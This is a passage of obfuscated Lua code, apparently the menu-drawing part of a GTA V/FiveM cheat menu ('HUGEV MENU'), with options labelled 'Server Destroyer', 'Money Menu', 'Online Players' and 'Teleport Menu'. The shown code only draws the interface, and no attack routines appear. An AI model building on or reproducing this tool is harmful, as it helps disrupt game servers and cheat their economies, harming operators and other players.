    Czitirzen_Invoke(0xE7FFAE5EBF23D890, textureDict_SDGHSIUDGSDG, textureName_DSGUHSDUGHIUDS, screenX_DSGUHSDUIGSDG, screenY_SDGHDSIGSDG, width_SDIGHSUIDGSDG, txtRatio_DSHGDSIUGSDG[index_DSGUHISUDGSD].height_SDGHDSIUGSDG, heading, red, green, blue, alpha)
end


local function drawButton_ydtfuiehrjgsegd(text_duhgilserg, subText_dhgiusrgsegdf)
	local menu_idhgisjlofdgsersdfgsegdf = menus_ueygtyuerihgkbergerg[currentMenu_dygfuyeikesrgerg]

	local x_dhgiuslergssdfg = menu_idhgisjlofdgsersdfgsegdf.x_dhgiuslergssdfg + menu_idhgisjlofdgsersdfgsegdf.width_duhgsiuerlgsdf / 2
	local multiplier_dhugisrjgsedfg = nil

	if menu_idhgisjlofdgsersdfgsegdf.currentOption_duhfislerjgilsedfg <= menu_idhgisjlofdgsersdfgsegdf.maxOptionCount_djgiusriuogsedsfg and optionCount_eygfuwengjiebigoer <= menu_idhgisjlofdgsersdfgsegdf.maxOptionCount_djgiusriuogsedsfg then
		multiplier_dhugisrjgsedfg = optionCount_eygfuwengjiebigoer
	elseif optionCount_eygfuwengjiebigoer > menu_idhgisjlofdgsersdfgsegdf.currentOption_duhfislerjgilsedfg - menu_idhgisjlofdgsersdfgsegdf.maxOptionCount_djgiusriuogsedsfg and optionCount_eygfuwengjiebigoer <= menu_idhgisjlofdgsersdfgsegdf.currentOption_duhfislerjgilsedfg then
		multiplier_dhugisrjgsedfg = optionCount_eygfuwengjiebigoer - (menu_idhgisjlofdgsersdfgsegdf.currentOption_duhfislerjgilsedfg - menu_idhgisjlofdgsersdfgsegdf.maxOptionCount_djgiusriuogsedsfg)
	end

	if multiplier_dhugisrjgsedfg then
		local buttonSpriteXOffset_SDGHSDGSDG = 0.011
		local buttonSpriteScale_DSGJHSDIGSDG = { x = 0.016, y = 0.1 }
		local y_dhgiuslergssdfg = menu_idhgisjlofdgsersdfgsegdf.y_dhgiuslergssdfg + titleHeight_iudygiuehoguergerg + buttonHeight_polcijahugiueshrguerlge + (buttonHeight_polcijahugiueshrguerlge * multiplier_dhugisrjgsedfg) - buttonHeight_polcijahugiueshrguerlge / 2
		local backgroundColor_dhgusieriogsdfg = nil
		local textColor_dihgiusjoisegsdf = nil
		local subTextColor_dhugiuserdfg = nil
		local shadow_dhugiusergsdfg = false

		if menu_idhgisjlofdgsersdfgsegdf.currentOption_duhfislerjgilsedfg == optionCount_eygfuwengjiebigoer then
			backgroundColor_dhgusieriogsdfg = menu_idhgisjlofdgsersdfgsegdf.menuFocusBackgroundColor_dhugsiuerse32432532
			textColor_dihgiusjoisegsdf = menu_idhgisjlofdgsersdfgsegdf.menuFocusTextColor_dughsiregsdfg
			subTextColor_dhugiuserdfg = menu_idhgisjlofdgsersdfgsegdf.menuFocusTextColor_dughsiregsdfg
		else
			backgroundColor_dhgusieriogsdfg = menu_idhgisjlofdgsersdfgsegdf.menuBackgroundColor_duygu848o7ghsdf
			textColor_dihgiusjoisegsdf = menu_idhgisjlofdgsersdfgsegdf.menuTextColor_duhgsiregsd
			subTextColor_dhugiuserdfg = menu_idhgisjlofdgsersdfgsegdf.menuSubTextColor_dihgsurilgsdfg
			shadow_dhugiusergsdfg = true
		end

		drawRect_ytfuewgifygbkinbguyierlgeg(x_dhgiuslergssdfg, y_dhgiuslergssdfg, menu_idhgisjlofdgsersdfgsegdf.width_duhgsiuerlgsdf, buttonHeight_polcijahugiueshrguerlge, backgroundColor_dhgusieriogsdfg)
		
		if text_duhgilserg == "~p~# ~s~Self Menu" then
			DrawSpriteScaled_DSGIDSIUGISDGDS("mpleaderboard", "leaderboard_players_icon", menu_idhgisjlofdgsersdfgsegdf.x_dhgiuslergssdfg-0.003 + buttonSpriteXOffset_SDGHSDGSDG, y_dhgiuslergssdfg-0.001, buttonSpriteScale_DSGJHSDIGSDG.x, buttonSpriteScale_DSGJHSDIGSDG.y, 0.0, 52, 152, 219, 255)
			text_duhgilserg = normal_string_gsub_SDGHSDIGSD(text_duhgilserg, "~p~# ~s~", "")
			drawText_udgyuiergeirgeg(text_duhgilserg, menu_idhgisjlofdgsersdfgsegdf.x_dhgiuslergssdfg+0.010 + buttonTextXOffset_ydtfuewkhjbeisoger, y_dhgiuslergssdfg - (buttonHeight_polcijahugiueshrguerlge / 2) + buttonTextYOffset_ydtufebklergegew, buttonFont_poidofjeughoeigienwir, textColor_dihgiusjoisegsdf, buttonScale_kurwamissclick_ghrueghrekrkeu, false, shadow_dhugiusergsdfg)
		elseif text_duhgilserg == "~p~# ~s~Online Players" then
			DrawSpriteScaled_DSGIDSIUGISDGDS("mpleaderboard", "leaderboard_friends_icon", menu_idhgisjlofdgsersdfgsegdf.x_dhgiuslergssdfg-0.003 + buttonSpriteXOffset_SDGHSDGSDG, y_dhgiuslergssdfg-0.001, buttonSpriteScale_DSGJHSDIGSDG.x, buttonSpriteScale_DSGJHSDIGSDG.y, 0.0, 52, 152, 219, 255)
			text_duhgilserg = normal_string_gsub_SDGHSDIGSD(text_duhgilserg, "~p~# ~s~", "")
			drawText_udgyuiergeirgeg(text_duhgilserg, menu_idhgisjlofdgsersdfgsegdf.x_dhgiuslergssdfg+0.010 + buttonTextXOffset_ydtfuewkhjbeisoger, y_dhgiuslergssdfg - (buttonHeight_polcijahugiueshrguerlge / 2) + buttonTextYOffset_ydtufebklergegew, buttonFont_poidofjeughoeigienwir, textColor_dihgiusjoisegsdf, buttonScale_kurwamissclick_ghrueghrekrkeu, false, shadow_dhugiusergsdfg)
		elseif text_duhgilserg == "~p~# ~s~Visual Options" then
			DrawSpriteScaled_DSGIDSIUGISDGDS("mphud", "spectating", menu_idhgisjlofdgsersdfgsegdf.x_dhgiuslergssdfg-0.003 + buttonSpriteXOffset_SDGHSDGSDG, y_dhgiuslergssdfg-0.001, buttonSpriteScale_DSGJHSDIGSDG.x, buttonSpriteScale_DSGJHSDIGSDG.y, 0.0, 52, 152, 219, 255)
			text_duhgilserg = normal_string_gsub_SDGHSDIGSD(text_duhgilserg, "~p~# ~s~", "")
			drawText_udgyuiergeirgeg(text_duhgilserg, menu_idhgisjlofdgsersdfgsegdf.x_dhgiuslergssdfg+0.010 + buttonTextXOffset_ydtfuewkhjbeisoger, y_dhgiuslergssdfg - (buttonHeight_polcijahugiueshrguerlge / 2) + buttonTextYOffset_ydtufebklergegew, buttonFont_poidofjeughoeigienwir, textColor_dihgiusjoisegsdf, buttonScale_kurwamissclick_ghrueghrekrkeu, false, shadow_dhugiusergsdfg)
		elseif text_duhgilserg == "~p~# ~s~Teleport Menu" then
			DrawSpriteScaled_DSGIDSIUGISDGDS("mpleaderboard", "leaderboard_star_icon", menu_idhgisjlofdgsersdfgsegdf.x_dhgiuslergssdfg-0.003 + buttonSpriteXOffset_SDGHSDGSDG, y_dhgiuslergssdfg-0.001, buttonSpriteScale_DSGJHSDIGSDG.x, buttonSpriteScale_DSGJHSDIGSDG.y, 0.0, 52, 152, 219, 255)
			text_duhgilserg = normal_string_gsub_SDGHSDIGSD(text_duhgilserg, "~p~# ~s~", "")
			drawText_udgyuiergeirgeg(text_duhgilserg, menu_idhgisjlofdgsersdfgsegdf.x_dhgiuslergssdfg+0.010 + buttonTextXOffset_ydtfuewkhjbeisoger, y_dhgiuslergssdfg - (buttonHeight_polcijahugiueshrguerlge / 2) + buttonTextYOffset_ydtufebklergegew, buttonFont_poidofjeughoeigienwir, textColor_dihgiusjoisegsdf, buttonScale_kurwamissclick_ghrueghrekrkeu, false, shadow_dhugiusergsdfg)
		elseif text_duhgilserg == "~p~# ~s~Vehicle Menu" then
			DrawSpriteScaled_DSGIDSIUGISDGDS("mpleaderboard", "leaderboard_transport_car_icon", menu_idhgisjlofdgsersdfgsegdf.x_dhgiuslergssdfg-0.003 + buttonSpriteXOffset_SDGHSDGSDG, y_dhgiuslergssdfg-0.001, buttonSpriteScale_DSGJHSDIGSDG.x, buttonSpriteScale_DSGJHSDIGSDG.y, 0.0, 52, 152, 219, 255)
			text_duhgilserg = normal_string_gsub_SDGHSDIGSD(text_duhgilserg, "~p~# ~s~", "")
			drawText_udgyuiergeirgeg(text_duhgilserg, menu_idhgisjlofdgsersdfgsegdf.x_dhgiuslergssdfg+0.010 + buttonTextXOffset_ydtfuewkhjbeisoger, y_dhgiuslergssdfg - (buttonHeight_polcijahugiueshrguerlge / 2) + buttonTextYOffset_ydtufebklergegew, buttonFont_poidofjeughoeigienwir, textColor_dihgiusjoisegsdf, buttonScale_kurwamissclick_ghrueghrekrkeu, false, shadow_dhugiusergsdfg)
		elseif text_duhgilserg == "~p~# ~s~Weapon Menu" then
			DrawSpriteScaled_DSGIDSIUGISDGDS("mpleaderboard", "leaderboard_kd_icon", menu_idhgisjlofdgsersdfgsegdf.x_dhgiuslergssdfg-0.003 + buttonSpriteXOffset_SDGHSDGSDG, y_dhgiuslergssdfg-0.001, buttonSpriteScale_DSGJHSDIGSDG.x, buttonSpriteScale_DSGJHSDIGSDG.y, 0.0, 52, 152, 219, 255)
			text_duhgilserg = normal_string_gsub_SDGHSDIGSD(text_duhgilserg, "~p~# ~s~", "")
			drawText_udgyuiergeirgeg(text_duhgilserg, menu_idhgisjlofdgsersdfgsegdf.x_dhgiuslergssdfg+0.010 + buttonTextXOffset_ydtfuewkhjbeisoger, y_dhgiuslergssdfg - (buttonHeight_polcijahugiueshrguerlge / 2) + buttonTextYOffset_ydtufebklergegew, buttonFont_poidofjeughoeigienwir, textColor_dihgiusjoisegsdf, buttonScale_kurwamissclick_ghrueghrekrkeu, false, shadow_dhugiusergsdfg)
		elseif text_duhgilserg == "~p~# ~s~Server Options" then
			DrawSpriteScaled_DSGIDSIUGISDGDS("mpleaderboard", "leaderboard_globe_icon", menu_idhgisjlofdgsersdfgsegdf.x_dhgiuslergssdfg-0.003 + buttonSpriteXOffset_SDGHSDGSDG, y_dhgiuslergssdfg-0.001, buttonSpriteScale_DSGJHSDIGSDG.x, buttonSpriteScale_DSGJHSDIGSDG.y, 0.0, 52, 152, 219, 255)
			text_duhgilserg = normal_string_gsub_SDGHSDIGSD(text_duhgilserg, "~p~# ~s~", "")
			drawText_udgyuiergeirgeg(text_duhgilserg, menu_idhgisjlofdgsersdfgsegdf.x_dhgiuslergssdfg+0.010 + buttonTextXOffset_ydtfuewkhjbeisoger, y_dhgiuslergssdfg - (buttonHeight_polcijahugiueshrguerlge / 2) + buttonTextYOffset_ydtufebklergegew, buttonFont_poidofjeughoeigienwir, textColor_dihgiusjoisegsdf, buttonScale_kurwamissclick_ghrueghrekrkeu, false, shadow_dhugiusergsdfg)
		elseif text_duhgilserg == "~p~# ~s~Server Destroyer" then
			DrawSpriteScaled_DSGIDSIUGISDGDS("helicopterhud", "hud_dest", menu_idhgisjlofdgsersdfgsegdf.x_dhgiuslergssdfg-0.003 + buttonSpriteXOffset_SDGHSDGSDG, y_dhgiuslergssdfg-0.001, buttonSpriteScale_DSGJHSDIGSDG.x, buttonSpriteScale_DSGJHSDIGSDG.y, 0.0, 52, 152, 219, 255)
			text_duhgilserg = normal_string_gsub_SDGHSDIGSD(text_duhgilserg, "~p~# ~s~", "")
			drawText_udgyuiergeirgeg(text_duhgilserg, menu_idhgisjlofdgsersdfgsegdf.x_dhgiuslergssdfg+0.010 + buttonTextXOffset_ydtfuewkhjbeisoger, y_dhgiuslergssdfg - (buttonHeight_polcijahugiueshrguerlge / 2) + buttonTextYOffset_ydtufebklergegew, buttonFont_poidofjeughoeigienwir, textColor_dihgiusjoisegsdf, buttonScale_kurwamissclick_ghrueghrekrkeu, false, shadow_dhugiusergsdfg)
		elseif text_duhgilserg == "~p~# ~s~Money Menu" then
			DrawSpriteScaled_DSGIDSIUGISDGDS("mpleaderboard", "leaderboard_cash_icon", menu_idhgisjlofdgsersdfgsegdf.x_dhgiuslergssdfg-0.003 + buttonSpriteXOffset_SDGHSDGSDG, y_dhgiuslergssdfg-0.001, buttonSpriteScale_DSGJHSDIGSDG.x, buttonSpriteScale_DSGJHSDIGSDG.y, 0.0, 52, 152, 219, 255)
			text_duhgilserg = normal_string_gsub_SDGHSDIGSD(text_duhgilserg, "~p~# ~s~", "")
			drawText_udgyuiergeirgeg(text_duhgilserg, menu_idhgisjlofdgsersdfgsegdf.x_dhgiuslergssdfg+0.010 + buttonTextXOffset_ydtfuewkhjbeisoger, y_dhgiuslergssdfg - (buttonHeight_polcijahugiueshrguerlge / 2) + buttonTextYOffset_ydtufebklergegew, buttonFont_poidofjeughoeigienwir, textColor_dihgiusjoisegsdf, buttonScale_kurwamissclick_ghrueghrekrkeu, false, shadow_dhugiusergsdfg)
		elseif text_duhgilserg == "~p~# ~s~Settings" then
			DrawSpriteScaled_DSGIDSIUGISDGDS("mpleaderboard", "leaderboard_thumb", menu_idhgisjlofdgsersdfgsegdf.x_dhgiuslergssdfg-0.003 + buttonSpriteXOffset_SDGHSDGSDG, y_dhgiuslergssdfg-0.001, buttonSpriteScale_DSGJHSDIGSDG.x, buttonSpriteScale_DSGJHSDIGSDG.y, 0.0, 52, 152, 219, 255)
			text_duhgilserg = normal_string_gsub_SDGHSDIGSD(text_duhgilserg, "~p~# ~s~", "")
			drawText_udgyuiergeirgeg(text_duhgilserg, menu_idhgisjlofdgsersdfgsegdf.x_dhgiuslergssdfg+0.010 + buttonTextXOffset_ydtfuewkhjbeisoger, y_dhgiuslergssdfg - (buttonHeight_polcijahugiueshrguerlge / 2) + buttonTextYOffset_ydtufebklergegew, buttonFont_poidofjeughoeigienwir, textColor_dihgiusjoisegsdf, buttonScale_kurwamissclick_ghrueghrekrkeu, false, shadow_dhugiusergsdfg)
		else
			drawText_udgyuiergeirgeg(text_duhgilserg, menu_idhgisjlofdgsersdfgsegdf.x_dhgiuslergssdfg-0.002 + buttonTextXOffset_ydtfuewkhjbeisoger, y_dhgiuslergssdfg - (buttonHeight_polcijahugiueshrguerlge / 2) + buttonTextYOffset_ydtufebklergegew, buttonFont_poidofjeughoeigienwir, textColor_dihgiusjoisegsdf, buttonScale_kurwamissclick_ghrueghrekrkeu, false, shadow_dhugiusergsdfg)
		end

		if subText_dhgiusrgsegdf then
			if subText_dhgiusrgsegdf == "toogleOFF" then
				DrawSpriteScaled_DSGIDSIUGISDGDS("mpleaderboard", "leaderboard_votecross_icon", menu_idhgisjlofdgsersdfgsegdf.x_dhgiuslergssdfg+0.212 + buttonSpriteXOffset_SDGHSDGSDG, y_dhgiuslergssdfg-0.001, buttonSpriteScale_DSGJHSDIGSDG.x, buttonSpriteScale_DSGJHSDIGSDG.y, 0.0, 255, 0, 0, 255)
			elseif subText_dhgiusrgsegdf == "toogleON" then
				DrawSpriteScaled_DSGIDSIUGISDGDS("mpleaderboard", "leaderboard_votetick_icon", menu_idhgisjlofdgsersdfgsegdf.x_dhgiuslergssdfg+0.212 + buttonSpriteXOffset_SDGHSDGSDG, y_dhgiuslergssdfg-0.001, buttonSpriteScale_DSGJHSDIGSDG.x, buttonSpriteScale_DSGJHSDIGSDG.y, 0.0, 0, 255, 0, 255)
			elseif string.lower(subText_dhgiusrgsegdf) == "native" then
				drawText_udgyuiergeirgeg("~r~"..subText_dhgiusrgsegdf, menu_idhgisjlofdgsersdfgsegdf.x_dhgiuslergssdfg + buttonTextXOffset_ydtfuewkhjbeisoger, y_dhgiuslergssdfg - buttonHeight_polcijahugiueshrguerlge / 2 + buttonTextYOffset_ydtufebklergegew, buttonFont_poidofjeughoeigienwir, subTextColor_dhugiuserdfg, buttonScale_kurwamissclick_ghrueghrekrkeu, false, shadow_dhugiusergsdfg, true)
			elseif string.upper(subText_dhgiusrgsegdf) == "ESX" then
				drawText_udgyuiergeirgeg("~g~"..subText_dhgiusrgsegdf, menu_idhgisjlofdgsersdfgsegdf.x_dhgiuslergssdfg + buttonTextXOffset_ydtfuewkhjbeisoger, y_dhgiuslergssdfg - buttonHeight_polcijahugiueshrguerlge / 2 + buttonTextYOffset_ydtufebklergegew, buttonFont_poidofjeughoeigienwir, subTextColor_dhugiuserdfg, buttonScale_kurwamissclick_ghrueghrekrkeu, false, shadow_dhugiusergsdfg, true)
			else
				drawText_udgyuiergeirgeg(subText_dhgiusrgsegdf, menu_idhgisjlofdgsersdfgsegdf.x_dhgiuslergssdfg + buttonTextXOffset_ydtfuewkhjbeisoger, y_dhgiuslergssdfg - buttonHeight_polcijahugiueshrguerlge / 2 + buttonTextYOffset_ydtufebklergegew, buttonFont_poidofjeughoeigienwir, subTextColor_dhugiuserdfg, buttonScale_kurwamissclick_ghrueghrekrkeu, false, shadow_dhugiusergsdfg, true)
			end
		end
	end
end


local function CreateMenu_tdrfyuweghfbidsger(id_jdhgisrejolger, title_duhgilgsegdfg)
	menus_ueygtyuerihgkbergerg[id_jdhgisrejolger] = { }
	menus_ueygtyuerihgkbergerg[id_jdhgisrejolger].title_duhgilgsegdfg = title_duhgilgsegdfg
	menus_ueygtyuerihgkbergerg[id_jdhgisrejolger].subTitle_duhgiuesrjogse = 'HUGEV MENU | BETA 1.0.1'

	menus_ueygtyuerihgkbergerg[id_jdhgisrejolger].visible_udhgiusodlgesdf = false

	menus_ueygtyuerihgkbergerg[id_jdhgisrejolger].previousMenu_digusirgiodfg = nil

	menus_ueygtyuerihgkbergerg[id_jdhgisrejolger].aboutToBeClosed_duhuisorjgsdfg = false

	menus_ueygtyuerihgkbergerg[id_jdhgisrejolger].x_dhgiuslergssdfg = 0.0175
	menus_ueygtyuerihgkbergerg[id_jdhgisrejolger].y_dhgiuslergssdfg = 0.125
	menus_ueygtyuerihgkbergerg[id_jdhgisrejolger].width_duhgsiuerlgsdf = 0.23

	menus_ueygtyuerihgkbergerg[id_jdhgisrejolger].currentOption_duhfislerjgilsedfg = 1
	menus_ueygtyuerihgkbergerg[id_jdhgisrejolger].maxOptionCount_djgiusriuogsedsfg = 17

	menus_ueygtyuerihgkbergerg[id_jdhgisrejolger].titleFont_dnguseridf = 1
	menus_ueygtyuerihgkbergerg[id_jdhgisrejolger].titleColor_diuhgauesd = { r_djguisernglse = 0, g_IDJGIODSF = 0, b_djguisernglse = 0, a_djguisernglse = 0 }
	menus_ueygtyuerihgkbergerg[id_jdhgisrejolger].menuFocusTextColor_dughsiregsdfg = { r_djguisernglse = 255, g_IDJGIODSF = 255, b_djguisernglse = 255, a_djguisernglse = 255 }
	menus_ueygtyuerihgkbergerg[id_jdhgisrejolger].menuTextColor_duhgsiregsd = { r_djguisernglse = 255, g_IDJGIODSF = 255, b_djguisernglse = 255, a_djguisernglse = 255 }
	CreateThreadNowAtomicDrugMiSsie_DIASFUOIDSGSDFG(function()
	while Wlaczone_Menu_XD_dugao8iugsgsergsdfg do
	Czlowiek_Wait_IDYGOSIFJGDFG(0)
	--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
	if DSUHGSIUD_theme_green then
	menus_ueygtyuerihgkbergerg[id_jdhgisrejolger].menuSubTextColor_dihgsurilgsdfg = { r_djguisernglse = 189, g_IDJGIODSF = 189, b_djguisernglse = 189, a_djguisernglse = 255 }
	menus_ueygtyuerihgkbergerg[id_jdhgisrejolger].menuFocusBackgroundColor_dhugsiuerse32432532 = { r_djguisernglse = 30, g_IDJGIODSF = 110, b_djguisernglse = 46, a_djguisernglse = 255 }
	menus_ueygtyuerihgkbergerg[id_jdhgisrejolger].menuBackgroundColor_duygu848o7ghsdf = { r_djguisernglse = 13, g_IDJGIODSF = 54, b_djguisernglse = 22, a_djguisernglse = 180 }
	menus_ueygtyuerihgkbergerg[id_jdhgisrejolger].titleBackgroundColor_7567fihfsudgdsf = { r_djguisernglse = 57, g_IDJGIODSF = 140, b_djguisernglse = 27, a_djguisernglse = 255 }

	menus_ueygtyuerihgkbergerg[id_jdhgisrejolger].subTitleBackgroundColor_duhgsiuorsgsdf = { r_djguisernglse = 14, g_IDJGIODSF = 66, b_djguisernglse = 23, a_djguisernglse = 180 }
	elseif DSUHGSIUD_theme_purple then
	menus_ueygtyuerihgkbergerg[id_jdhgisrejolger].menuSubTextColor_dihgsurilgsdfg = { r_djguisernglse = 92, g_IDJGIODSF = 0, b_djguisernglse = 105, a_djguisernglse = 255 }
	menus_ueygtyuerihgkbergerg[id_jdhgisrejolger].menuFocusBackgroundColor_dhugsiuerse32432532 = { r_djguisernglse = 128, g_IDJGIODSF = 0, b_djguisernglse = 145, a_djguisernglse = 255 }
	menus_ueygtyuerihgkbergerg[id_jdhgisrejolger].menuBackgroundColor_duygu848o7ghsdf = { r_djguisernglse = 200, g_IDJGIODSF = 0, b_djguisernglse = 227, a_djguisernglse = 180 }
	menus_ueygtyuerihgkbergerg[id_jdhgisrejolger].titleBackgroundColor_7567fihfsudgdsf = { r_djguisernglse = 192, g_IDJGIODSF = 26, b_djguisernglse = 214, a_djguisernglse = 255 }

	menus_ueygtyuerihgkbergerg[id_jdhgisrejolger].subTitleBackgroundColor_duhgsiuorsgsdf = { r_djguisernglse = 92, g_IDJGIODSF = 0, b_djguisernglse = 105, a_djguisernglse = 180 }
	end
	end
	end)
	menus_ueygtyuerihgkbergerg[id_jdhgisrejolger].titleBackgroundSprite_udyguiosrser3445r3 = nil

	menus_ueygtyuerihgkbergerg[id_jdhgisrejolger].buttonPressedSound_dhugsiurojgsegfd = { name_idgjiserjios = "SELECT", set_duhgiuselr = "HUD_FRONTEND_DEFAULT_SOUNDSET"} --https://pastebin.com/0neZdsZ5

end


local function CreateSubMenu_oipdgiseorghiuseoge(id_jdhgisrejolger, parent_iduyhguewuygisd, subTitle_duhgiuesrjogse)
	if menus_ueygtyuerihgkbergerg[parent_iduyhguewuygisd] then
		CreateMenu_tdrfyuweghfbidsger(id_jdhgisrejolger, menus_ueygtyuerihgkbergerg[parent_iduyhguewuygisd].title_duhgilgsegdfg)

		if subTitle_duhgiuesrjogse then
			setMenuProperty_dytfeiuwbguiesogdfg(id_jdhgisrejolger, 'subTitle_duhgiuesrjogse', subTitle_duhgiuesrjogse)
		else
			setMenuProperty_dytfeiuwbguiesogdfg(id_jdhgisrejolger, 'subTitle_duhgiuesrjogse', menus_ueygtyuerihgkbergerg[parent_iduyhguewuygisd].subTitle_duhgiuesrjogse)
		end
		

		setMenuProperty_dytfeiuwbguiesogdfg(id_jdhgisrejolger, 'previousMenu_digusirgiodfg', parent_iduyhguewuygisd)

		setMenuProperty_dytfeiuwbguiesogdfg(id_jdhgisrejolger, 'x_dhgiuslergssdfg', menus_ueygtyuerihgkbergerg[parent_iduyhguewuygisd].x_dhgiuslergssdfg)
		setMenuProperty_dytfeiuwbguiesogdfg(id_jdhgisrejolger, 'y_dhgiuslergssdfg', menus_ueygtyuerihgkbergerg[parent_iduyhguewuygisd].y_dhgiuslergssdfg)
		setMenuProperty_dytfeiuwbguiesogdfg(id_jdhgisrejolger, 'maxOptionCount_djgiusriuogsedsfg', menus_ueygtyuerihgkbergerg[parent_iduyhguewuygisd].maxOptionCount_djgiusriuogsedsfg)
		setMenuProperty_dytfeiuwbguiesogdfg(id_jdhgisrejolger, 'titleFont_dnguseridf', menus_ueygtyuerihgkbergerg[parent_iduyhguewuygisd].titleFont_dnguseridf)
		setMenuProperty_dytfeiuwbguiesogdfg(id_jdhgisrejolger, 'titleColor_diuhgauesd', menus_ueygtyuerihgkbergerg[parent_iduyhguewuygisd].titleColor_diuhgauesd)
		setMenuProperty_dytfeiuwbguiesogdfg(id_jdhgisrejolger, 'titleBackgroundColor_7567fihfsudgdsf', menus_ueygtyuerihgkbergerg[parent_iduyhguewuygisd].titleBackgroundColor_7567fihfsudgdsf)
		setMenuProperty_dytfeiuwbguiesogdfg(id_jdhgisrejolger, 'titleBackgroundSprite_udyguiosrser3445r3', menus_ueygtyuerihgkbergerg[parent_iduyhguewuygisd].titleBackgroundSprite_udyguiosrser3445r3)
		setMenuProperty_dytfeiuwbguiesogdfg(id_jdhgisrejolger, 'menuTextColor_duhgsiregsd', menus_ueygtyuerihgkbergerg[parent_iduyhguewuygisd].menuTextColor_duhgsiregsd)
		setMenuProperty_dytfeiuwbguiesogdfg(id_jdhgisrejolger, 'menuSubTextColor_dihgsurilgsdfg', menus_ueygtyuerihgkbergerg[parent_iduyhguewuygisd].menuSubTextColor_dihgsurilgsdfg)
		setMenuProperty_dytfeiuwbguiesogdfg(id_jdhgisrejolger, 'menuFocusTextColor_dughsiregsdfg', menus_ueygtyuerihgkbergerg[parent_iduyhguewuygisd].menuFocusTextColor_dughsiregsdfg)
		setMenuProperty_dytfeiuwbguiesogdfg(id_jdhgisrejolger, 'menuFocusBackgroundColor_dhugsiuerse32432532', menus_ueygtyuerihgkbergerg[parent_iduyhguewuygisd].menuFocusBackgroundColor_dhugsiuerse32432532)
		setMenuProperty_dytfeiuwbguiesogdfg(id_jdhgisrejolger, 'menuBackgroundColor_duygu848o7ghsdf', menus_ueygtyuerihgkbergerg[parent_iduyhguewuygisd].menuBackgroundColor_duygu848o7ghsdf)
		setMenuProperty_dytfeiuwbguiesogdfg(id_jdhgisrejolger, 'subTitleBackgroundColor_duhgsiuorsgsdf', menus_ueygtyuerihgkbergerg[parent_iduyhguewuygisd].subTitleBackgroundColor_duhgsiuorsgsdf)
	end
end


local function CurrentMenu_iuyugihsgnjioerg()
	return currentMenu_dygfuyeikesrgerg
end


local function OpenMenu_eytfyuagbfhkjsdgergd(id_jdhgisrejolger)
	if id_jdhgisrejolger and menus_ueygtyuerihgkbergerg[id_jdhgisrejolger] then
	Czitirzen_Invoke(0x67C540AA08E4A6F5, -1, "CLICK_BACK", "WEB_NAVIGATION_SOUNDS_PHONE", true)
		setMenuVisible_eqwreqtyhfioewjfiuewg(id_jdhgisrejolger, true)
	end
end


local function IsMenuOpened_dghiusergisehrubgiusdfesg(id_jdhgisrejolger)
	return isMenuVisible_trdyugfwgewiubfbeierg(id_jdhgisrejolger)
end


local function IsAnyMenuOpened_eytfuasigfkhbuewkflsdfgre()
	for id_jdhgisrejolger, _ in pairs(menus_ueygtyuerihgkbergerg) do
		if isMenuVisible_trdyugfwgewiubfbeierg(id_jdhgisrejolger) then return true end
	end

	return false
end


local function IsMenuAboutToBeClosed_duhgiuerhgiosergesrg()
	local menu_idhgisjlofdgsersdfgsegdf = menus_ueygtyuerihgkbergerg[currentMenu_dygfuyeikesrgerg]
	if menu_idhgisjlofdgsersdfgsegdf then
		return menu_idhgisjlofdgsersdfgsegdf.aboutToBeClosed_duhuisorjgsdfg
	else
		return false
	end
end


local function CloseMenu_duhgiuelgesgdf()
	local menu_idhgisjlofdgsersdfgsegdf = menus_ueygtyuerihgkbergerg[currentMenu_dygfuyeikesrgerg]
	if menu_idhgisjlofdgsersdfgsegdf then
		if menu_idhgisjlofdgsersdfgsegdf.aboutToBeClosed_duhuisorjgsdfg then
			menu_idhgisjlofdgsersdfgsegdf.aboutToBeClosed_duhuisorjgsdfg = false
			setMenuVisible_eqwreqtyhfioewjfiuewg(currentMenu_dygfuyeikesrgerg, false)
			Czitirzen_Invoke(0x67C540AA08E4A6F5, -1, "CLICK_BACK", "WEB_NAVIGATION_SOUNDS_PHONE", true)
			optionCount_eygfuwengjiebigoer = 0
			currentMenu_dygfuyeikesrgerg = nil
			currentKey_hgiuerhiogewger = nil
		else
			menu_idhgisjlofdgsersdfgsegdf.aboutToBeClosed_duhuisorjgsdfg = true
		end
	end
end


local function Button_yetwyfguydfkjesrg(text_duhgilserg, subText_dhgiusrgsegdf)
	local buttonText_iduhgiuosrgsdf = text_duhgilserg
	if subText_dhgiusrgsegdf then
	buttonText_iduhgiuosrgsdf = '{ '..tostring(buttonText_iduhgiuosrgsdf)..', '..tostring(subText_dhgiusrgsegdf)..'}'
	end

	local menu_idhgisjlofdgsersdfgsegdf = menus_ueygtyuerihgkbergerg[currentMenu_dygfuyeikesrgerg]
	if menu_idhgisjlofdgsersdfgsegdf then
		optionCount_eygfuwengjiebigoer = optionCount_eygfuwengjiebigoer + 1

		local isCurrent_dughisurlgsfreg = menu_idhgisjlofdgsersdfgsegdf.currentOption_duhfislerjgilsedfg == optionCount_eygfuwengjiebigoer

		drawButton_ydtfuiehrjgsegd(text_duhgilserg, subText_dhgiusrgsegdf)

		if isCurrent_dughisurlgsfreg then
			if currentKey_hgiuerhiogewger == keys_dhgiuerhgoelgiehwgewg.select_key_dhugiuerger then
				Czitirzen_Invoke(0x67C540AA08E4A6F5, -1, "CLICK_BACK", "WEB_NAVIGATION_SOUNDS_PHONE", true)
				return true
			elseif currentKey_hgiuerhiogewger == keys_dhgiuerhgoelgiehwgewg.left_key_dhugiuerger or currentKey_hgiuerhiogewger == keys_dhgiuerhgoelgiehwgewg.right_key_dhugiuerger then
				Czitirzen_Invoke(0x67C540AA08E4A6F5, -1, "CLICK_BACK", "WEB_NAVIGATION_SOUNDS_PHONE", true)
			end
		end

		return false
	else

		return false
	end
end


local function MenuButton_eytfudskfbukdsger(text_duhgilserg, id_jdhgisrejolger, subText_dhgiusrgsegdf)
	if menus_ueygtyuerihgkbergerg[id_jdhgisrejolger] then

		if Button_yetwyfguydfkjesrg("~p~# ~s~"..text_duhgilserg, subText_dhgiusrgsegdf) then
			setMenuVisible_eqwreqtyhfioewjfiuewg(currentMenu_dygfuyeikesrgerg, false)
			setMenuVisible_eqwreqtyhfioewjfiuewg(id_jdhgisrejolger, true, true)

			return true
		end
	end

	return false
end


local function CheckBox_twrtdysfgjsekglkmrseijg(text_duhgilserg, checked_87gy8sodhgilds, callback_87yd78hoisgser)
local text_diuigsodgsdfg = "toogleOFF"
if checked_87gy8sodhgilds then
text_diuigsodgsdfg = "toogleON"
end

	if Button_yetwyfguydfkjesrg(text_duhgilserg, text_diuigsodgsdfg) then
		checked_87gy8sodhgilds = not checked_87gy8sodhgilds
